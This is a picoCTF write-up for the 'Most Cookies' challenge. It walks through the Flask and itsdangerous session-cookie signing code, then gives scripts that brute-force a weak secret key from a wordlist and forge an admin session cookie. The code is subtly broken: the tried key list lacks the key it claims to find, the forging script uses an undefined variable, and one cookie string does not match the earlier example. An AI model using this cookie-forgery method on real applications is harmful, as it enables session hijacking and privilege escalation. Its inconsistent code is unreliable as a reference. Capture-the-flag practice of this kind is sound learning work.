---
title: "PicoCTF - Most Cookies"
date:   2024-09-10 19:23:10
categories: [Write-ups, PicoCTF]
tags: [web]
description: deeply get into flask handling cookie, inspired by paradoxis (https://www.paradoxis.nl/)
---

## How it works

### .local/lib/python3.10/site-packages/itsdangerous/url_safe.py

```python
class URLSafeSerializerMixin(Serializer[str]):
    """Mixed in with a regular serializer it will attempt to zlib
    compress the string to make it shorter if necessary. It will also
    base64 encode the string so that it can safely be placed in a URL.
    """

    default_serializer: _PDataSerializer[str] = _CompactJSON

    def load_payload(
        self,
        payload: bytes,
        *args: t.Any,
        serializer: t.Any | None = None,
        **kwargs: t.Any,
    ) -> t.Any:
        decompress = False

        if payload.startswith(b"."):
            payload = payload[1:]  # get the data after #
            decompress = True

        try:
            json = base64_decode(payload)
        except Exception as e:
            raise BadPayload(
                "Could not base64 decode the payload because of an exception",
                original_error=e,
            ) from e

        if decompress:
            try:
                json = zlib.decompress(json)
            except Exception as e:
                raise BadPayload(
                    "Could not zlib decompress the payload before decoding the payload",
                    original_error=e,
                ) from e

        return super().load_payload(json, *args, **kwargs)
```

load_payload() method is used for remove the dot (“.”) from payload and decode to base64, this process like the first part of flask cookie, then return the bytes by zlib.decompress

Here is example of encode airflow in Flask:
-   dump_payload() in url_safe.py
-   encoding.py


```python
import zlib
import base64

trg = b'truong'

def base64_decode(string: str | bytes) -> bytes:
    """Base64 decode a URL-safe string of bytes or text. The result is
    bytes.
    """
    string = want_bytes(string, encoding="ascii", errors="ignore")
    string += b"=" * (-len(string) % 4)

    try:
        return base64.urlsafe_b64decode(string)
    except (TypeError, ValueError) as e:
        raise BadData("Invalid base64-encoded data") from e

def want_bytes(
    s: str | bytes, encoding: str = "utf-8", errors: str = "strict"
) -> bytes:
    if isinstance(s, str):
        s = s.encode(encoding, errors)
    return s

def base64_encode(string: str | bytes) -> bytes:
    """Base64 encode a string of bytes or text. The resulting bytes are
    safe to use in URLs.
    """
    string = want_bytes(string)
    return base64.urlsafe_b64encode(string).rstrip(b"=")

compressed = zlib.compress(trg)
base64d = base64_encode(compressed)

base64d = b'.' + base64d

print(base64d)
```

In write-up Baking Flask cookie, we got note that class SecureCookieSessionInterface in flask/session.py is handling the cookie. 

The def get_signing_serializer() cookie function return the URLSafeTimedSerializer the which call the function URLSafeSerializerMixin as i analyzed in upper part, inherited form Serializer class  (Mixed in with a regular serializer it will attempt to zlib compress the string to make it shorter if necessary. It will also base64 encode the string so that it can safely be placed in a URL.)

All the COOKIE-HANDLING code is at “itsdangerous” folder Python package
Verifying the cryptographic part (last of JWT) is handled by signer.py.


### serializer.loads(signed_value)
 
 * Purpose: This method is used to verify and deserialize the signed session cookie. => call to signer object and check

 ```python 
def loads(
        self, s: str | bytes, salt: str | bytes | None = None, **kwargs: t.Any
    ) -> t.Any:
    """Reverse of :meth:`dumps`. Raises :exc:`.BadSignature` if the
    signature validation fails.
    """
    s = want_bytes(s)
    last_exception = None
    for signer in self.iter_unsigners(salt):
        try:
            return self.load_payload(signer.unsign(s))
        except BadSignature as err:
            last_exception = err
    raise t.cast(BadSignature, last_exception)
 ```

### serializer.dumps(cookie_value)

 * Purpose: This method is used to create a signed session cookie. => take the secret and signing

```python
def dumps(self, obj: t.Any, salt: str | bytes | None = None) -> _TSerialized:
    """Returns a signed string serialized with the internal
    serializer. The return value can be either a byte or unicode
    string depending on the format of the internal serializer.
    """
    payload = want_bytes(self.dump_payload(obj))
    rv = self.make_signer(salt).sign(payload)

    if self.is_text_serializer:
        return rv.decode("utf-8")  # type: ignore[return-value]

    return rv  # type: ignore[return-value]
```
## Exploitation

In 295, dist-packages/flask/sessions.py

```python
   1. salt = “cookie-session”’
   2. digest_method = staticmethod(_lazy_sha1)			// sha1
// key derivation method
   3. key_derivation = “hmac”	

// A python serializer for the payload. The default is a compact JSON derived serializer with support for some extra Python types such as datetime objects or tuples
   4. serializer = session_json_serializer  	== TaggedJSONSerializer()
```

### get_signing_serializer() => return

```python
return URLSafeTimedSerializer(
    app.secret_key,
    salt=self.salt,
    serializer=self.serializer,
    signer_kwargs=signer_kwargs,
)
```
Get a URLSafeTimedSerializer object by Flask object. Then assign the value of the cookie name to “val”. If “val” is falsy, reload the session.
* data = s.loads(val, max_age=max_age)

```python
def open_session(self, app: Flask, request: Request) -> SecureCookieSession | None:
    s = self.get_signing_serializer(app)
    if s is None:
        return None
    val = request.cookies.get(self.get_cookie_name(app))
    if not val:
        return self.session_class()
    max_age = int(app.permanent_session_lifetime.total_seconds())
    try:
        data = s.loads(val, max_age=max_age)
        return self.session_class(data)
    except BadSignature:
        return self.session_class()
```

### timed.py 

loads function in timed.py:

 ```python
 class TimedSerializer(Serializer[_TSerialized]):
    def loads(
        self, s: str, *, max_age: t.Optional[int] = None, salt: t.Optional[str] = None, return_timestamp: bool = False
    ) -> t.Any:
        """
        Reverse of :meth:`dumps`, raises :exc:`.BadSignature` if the signature validation fails. If a ``max_age`` is provided it will
        ensure the signature is not older than that time in seconds. In that case the signature is outdated, :exc:`.SignatureExpired` is
        raised. All arguments are forwarded to the signer's :meth:`~TimestampSigner.unsign` method.
        """
        s = want_bytes(s)
        last_exception = None

        for signer in self.iter_unsigners(salt):
            try:
                base64d, timestamp = signer.unsign(
                    s, max_age=max_age, return_timestamp=True
                )
                payload = self.load_payload(base64d)

                if return_timestamp:
                    return payload, timestamp

                return payload
            except SignatureExpired:
                # The signature was unsigned successfully but was expired. Do not try the next signer.
                raise
            except BadSignature as err:
                last_exception = err

        raise t.cast(BadSignature, last_exception)

 ```

* s : JWT cookie

So, if call to open_session(), then the Flask object do the validation by loads(), both check max-age and cryptographic.The loads() function in timed.py also called to unsign() If everything is go true

so the function iterate all signer, signer is a used for unsign => verify the cryptographic part

unsign() used in timed.py also inherited from class Signer, and check the timestamp for validation

```python

class TimestampSigner(Signer):
    ...
    def unsign(self, signed_value, max_age=None, return_timestamp=False):
        """
        Unsigned data with timestamp validation.
        """
        try:
            result = super().unsign(signed_value)
            sig_error = None
        except BadSignature as e:
            sig_error = e
            result = e.payload or b""
        
        # Additional logic for max_age and timestamp handling would go here.

```
If the verify with secret key and signature is going well
* result = abc.cde 

```python
def unsign(self, signed_value: str | bytes) -> bytes:
    """
    Unsings the given string.
    """
    signed_value = want_bytes(signed_value)

    if self.sep not in signed_value:
        raise BadSignature(f"No {self.sep!r} found in value")

    value, sig = signed_value.rsplit(self.sep, 1)

    if self.verify_signature(value, sig):
        return value

    raise BadSignature(f"Signature {sig!r} does not match", payload=value)
```
After `` value, sig = signed_value.rsplit(self.sep, 1)``
* abc.cde.efg => value = abc.cde, sig = efg

```python
def verify_signature(self, value: str | bytes, sig: str | bytes) -> bool:
    """
    Verifies the signature for the given value.
    """
    try:
        sig = base64_decode(sig)
    except Exception:
        return False

    value = want_bytes(value)

    for secret_key in reversed(self.secret_keys):
        key = self.derive_key(secret_key)

        if self.algorithm.verify_signature(key, value, sig):
            return True

    return False
```
`` for secret_key in reversed(self.secret_keys)``
=> Loop secret key with reverse order
`` key = self.derive_key(secret_key)``

Then:

```python
if secret_key is None:
    secret_key = self.secret_keys[-1]
else:
    secret_key = want_bytes(secret_key)

if self.key_derivation == "concat":
    return t.cast(bytes, self.digest_method(self.salt + secret_key).digest())
elif self.key_derivation == "django-concat":
    return t.cast(
        bytes, self.digest_method(self.salt + b"signer" + secret_key).digest()
    )
elif self.key_derivation == "hmac":
    mac = hmac.new(secret_key, digestmod=self.digest_method)
    mac.update(self.salt)
    return mac.digest()
elif self.key_derivation == "none":
    return secret_key
else:
    raise TypeError("Unknown key derivation method")
```
 
Secret_key is defined before, so server convert the secret_key to byte, our case is hmac
This creates a new HMAC object using the provided secret_key and a specific digest (hashing) method in our case is SHA-1, HMAC object that can be used to generate a hash (digest) from data combined with the secret key

`` mac.update(self.salt)`` => add salt to HMAC object
`` return mac.digest()``  =>  return the value after hashed

* `` key = self.derive_key(secret_key)``  => generate derived key.(KDF and SHA-1)


### Returning to the verify_signatrue()

Then key is iterated in list secret_keys, generate its KDF key with HMAC and SHA-1, then verify it with given value by 
`` verify_signature(key, value, sig)``

```python
def verify_signature(self, key: bytes, value: bytes, sig: bytes) -> bool:
    """
    Verifies the given signature matches the expected signature.
    """
    return hmac.compare_digest(sig, self.get_signature(key, value))
```
and 

```python
def get_signature(self, key: bytes, value: bytes) -> bytes:
    mac = hmac.new(key, msg=value, digestmod=self.digest_method)
    return mac.digest()
```

This function compare the sig, with the signature output of given key and given value (input first part of cookie abc.def). This return the signature of combining secret key and message

### unsign()


```python
def unsign(self, signed_value: str | bytes) -> bytes:
    """
    Unsings the given string.
    """
    signed_value = want_bytes(signed_value)

    if self.sep not in signed_value:
        raise BadSignature(f"No {self.sep!r} found in value")

    value, sig = signed_value.rsplit(self.sep, 1)

    if self.verify_signature(value, sig):
        return value

    raise BadSignature(f"Signature {sig!r} does not match", payload=value)
```

signed_value is the given cookie: abc.cde.efg, after rsplit => value = abc.cde sig = efg

if value is passed all function after it, then the unsign() is returning the abc.cde

### => back to unsign() in TimestampSigner(Signer) in timed.py

```python
try:
    result = super().unsign(signed_value)  # result = abc.cde
    sig_error = None
```
```python
if sep not in result:  # if "." not in result => going wrong
    if sig_error:
        raise sig_error
```
```python
value, ts_bytes = result.rsplit(sep, 1)
ts_int: int | None = None
ts_dt: datetime | None = None
```

*   value = abc
*   ts_bytes = cde

```python
try: 
    ts_int = bytes_to_int(base64_decode(ts_bytes))
```
* Example: tsbytes = Zt--Gw => ts_int  = 1725939227

Then if the timestamp is not expired and the unsign successful => return_timestamp = true => base64d = value (abc); timestamp = int(cde)

```python
s = want_bytes(s)  # JWT cookie
last_exception = None

for signer in self.iter_unsigners(salt):
    try:
        base64d, timestamp = signer.unsign(
            s, max_age=max_age, return_timestamp=True
        )
        payload = self.load_payload(base64d)

        if return_timestamp:
            return payload, timestamp

        return payload
    except SignatureExpired:
        # The signature was unsigned successfully but was expired.
        # Do not try the next signer.
        raise
    except BadSignature as err:
        last_exception = err

raise t.cast(BadSignature, last_exception)
```

load_payload() then call to loads() function in protocol _PDataSerializer, which is overloaded by loads() in Deserializer class:
* payload: abc(bytes)
* loads(payload.decode(“utf-8”)) => loads(‘eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9’)

#### return use_serializer.loads(‘eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9’)

From here, do a unsign() function for checking the cryptographic
=> return 

Then return a SecureCookieSession with data is the payload (“very_auth” = “admin”)

```python
        data = s.loads(val, max_age=max_age)
        return self.session_class(data)
```

## Payload

So for crack the cookie, we need to simulate all the process, then reverse it. Firstly, add all file in module “itsdangerous” to our exploit directory

##### JWT: abc.cde.efg

sessions.py -> open_session() -> loads() -> return “abc” -> signer.unsign() -> verifying sign, timestamp -> return payload: “abc”, timestamp: “cde” -> super().unsign(JWT) -> verifying signature -> derive key from secret key -> verifying (key, abc.cde, efg) return abc.cde -> compare hmac of sig and get_signature(key, abc.cde) 


* So, we just need to call the function loads(), the entire sequence is automatically processing

### Extract secretkey

```python
from .timed import TimestampSigner
from .url_safe import URLSafeTimedSerializer
from flask.json.tag import TaggedJSONSerializer
from hashlib import sha1
from .exc import BadSignature

secret_keys = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap"]
cookie = 'eyJ2ZXJ5X2F1dGgiOiJiGFuayJ9.ZuFMUQ.TSo7e1UwHHmAvToyoC6c7sGelTg'

for secret in secret_keys:
    try:
        serializer = URLSafeTimedSerializer(
            secret_key=secret,
            salt="cookie-session",
            serializer=TaggedJSONSerializer(),
            signer=TimestampSigner,
            signer_kwargs={
                'key_derivation': 'hmac',
                'digest_method': sha1
            }
        ).loads(cookie)
    except BadSignature:
        continue

    print('Secret key: {}'.format(secret))
```

This declare a new serializer by URLSafeTimedSerializer class, if cryptography part going true, print the secret to screen.
* Secret key: “peanut butter"

```python
session = {'very_auth': 'admin'}
print(URLSafeTimedSerializer(
    secret_key=shhh,
    salt='cookie-session',
    serializer=TaggedJSONSerializer(),
    signer=TimestampSigner,
    signer_kwargs={
        'key_derivation': 'hmac',
        'digest_method': sha1
    }
).dumps(session))

# serializer.loads(signed_value)
# Purpose: This method is used to verify and deserialize the signed session cookie.

# serializer.dumps(cookie_value)
# Purpose: This method is used to create a signed session cookie.
```

> picoCTF{pwn_4ll_th3_cook1E5_22fe0842}
